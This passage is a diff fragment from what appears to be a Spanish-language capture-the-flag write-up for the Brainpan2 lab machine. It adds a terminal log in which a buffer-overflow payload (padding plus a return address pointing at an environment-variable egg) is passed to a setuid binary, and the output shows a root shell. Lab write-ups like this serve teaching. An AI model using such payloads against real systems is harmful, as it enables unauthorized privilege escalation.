@@ -228,7 +228,14 @@ EGG => 0xbfff055c
 
 > Ejecutamos el EXPLOIT
 ```
-
+anansi@brainpan2:/home/reynard$ ./msg_root `python -c 'print "A" * 14 + "\x5c\x05\xff\xbf"'` msg  
+<ard$ ./msg_root `python -c 'print "A" * 14 + "\x5c\x05\xff\xbf"'` msg       
+$ id
+id
+uid=104(root) gid=1000(anansi) groups=106(root),50(staff),1000(anansi)
+$ whoami
+whoami
+root
 ```
 
 
